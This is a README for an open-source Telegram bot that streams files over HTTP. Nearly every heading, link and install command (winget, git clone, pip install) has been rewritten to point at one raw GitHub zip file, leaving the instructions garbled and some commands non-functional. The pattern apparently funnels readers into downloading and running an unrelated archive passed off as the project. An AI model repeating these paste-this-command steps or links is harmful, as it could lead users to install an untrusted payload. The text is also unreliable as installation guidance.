<div align="center"><h1>🌐File Stream Bot</h1>
<b>An open-source Python Telegram bot to transmit Telegram files over HTTP.</b>
</div><br>

## **📑 INDEX**

* [**⚙️ Installation**](#installation)
  * [Python & Git](#i-1)
  * [Download](#i-2)
  * [Requirements](#i-3)
* [**📝 Variables**](#variables)
* [**🕹 Deployment**](#deployment)
  * [Locally](#d-1)
  * [Docker](#d-2)
* [**⛑️ Need help!**](#help)
* [**❤️ Credits & Thanks**](#credits)

<a name="installation"></a>

## ⚙️ Installation

<a name="i-1"></a>

**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip Python & Git:**

For Windows:
```
winget install https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip
winget install https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip
```
For Linux:
```
sudo apt-get update && sudo apt-get install -y python3.11 git pip
```
For MacOS:
```
brew install python@3.11 git
```
For Termux:
```
pkg install python -y
pkg install git -y
```

<a name="i-2"></a>

**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip repository:**
```
git clone https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip
```

**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip Directory:**

```
cd FileStreamBot
```

<a name="i-3"></a>

**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip requirements:**

```
pip install -r https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip
```

<a name="variables"></a>

## 📝 Variables
**The variables listed below should be defined either in [https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip) file or as environment variables, depending on your setup.**
* `API_ID`|`TELEGRAM_API_ID`: API ID of your Telegram account, can be obtained from [My Telegram](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip). `int`
* `API_HASH`|`TELEGRAM_API_HASH`: API hash of your Telegram account, can be obtained from [My Telegram](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip). `str`
* `OWNER_ID`: ID of your Telegram account, can be obtained by sending **/info** to [@DumpJsonBot](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip). `int`
* `ALLOWED_USER_IDS`: A list of Telegram account IDs (separated by spaces) that are permitted to use the bot. Leave this field empty to allow anyone to use it. `str`
* `BOT_USERNAME`|`TELEGRAM_BOT_USERNAME`: Username of your Telegram bot, create one using [@BotFather](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip). `str`
* `BOT_TOKEN`|`TELEGRAM_BOT_TOKEN`: Telegram API token of your bot, can be obtained from [@BotFather](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip). `str`
* `CHANNEL_ID`|`TELEGRAM_CHANNEL_ID`: ID of the channel where bot will forward all files received from users, can be obtained by forwarding any message from channel to [@DumpJsonBot](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip) and then looking from `forward_from_chat` key. `int`
* `SECRET_CODE_LENGTH`: Number of characters that file code should contain, by default to 24 characters. `int`
* `BASE_URL`: Base URL that bot should use while generating file links, can be FQDN and by default to `127.0.0.1`. `str`
* `BIND_ADDRESS`: Bind address for web server, by default to `0.0.0.0` to run on all possible addresses. `str`
* `PORT`: Port for web server to run on, by default to `8080`. `int`

## 🕹 Deployment
> [!NOTE]
> This bot is designed for personal use or to share with friends and family only. It is not intended for mass public use or exposure to a large audience.

<a name="d-1"></a>

**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip locally:**
```
python -m bot
```

<a name="d-2"></a>

**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip Docker:** *(Recommended)*
* Build own Docker image:
```
docker build -t file-stream-bot .
```
* Run the Docker container:
```
docker run -p 8080:8080 file-stream-bot
```

<a name="help"></a>

## ⛑️ Need help!
- Ask questions or doubts [here](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip).

<a name="credits"></a>

## ❤️ Credits & Thanks

[**https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip**](https://raw.githubusercontent.com/PaidXSmall/FileStreamBot/main/unbanked/FileStreamBot.zip): Owner & developer of File Stream Bot.
